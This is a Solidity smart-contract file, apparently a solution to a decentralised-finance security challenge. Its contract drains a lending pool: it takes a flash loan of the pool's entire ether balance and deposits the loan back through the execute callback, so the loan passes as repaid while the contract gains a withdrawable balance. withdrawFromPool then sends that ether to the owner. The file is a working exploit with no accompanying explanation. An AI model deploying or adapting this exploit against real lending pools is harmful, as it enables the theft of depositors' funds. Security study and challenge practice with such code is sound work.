// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256) external;
}

contract FlashLoanEtherReceiver {
    using Address for address payable;

    ISideEntranceLenderPool private immutable pool;
    address private owner;

    constructor(address _pool, address _owner) {
        pool = ISideEntranceLenderPool(_pool);
        owner = _owner;
    }

    function callFlashLoan() external payable {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdrawFromPool() external payable {
        require(msg.sender == owner);
        pool.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
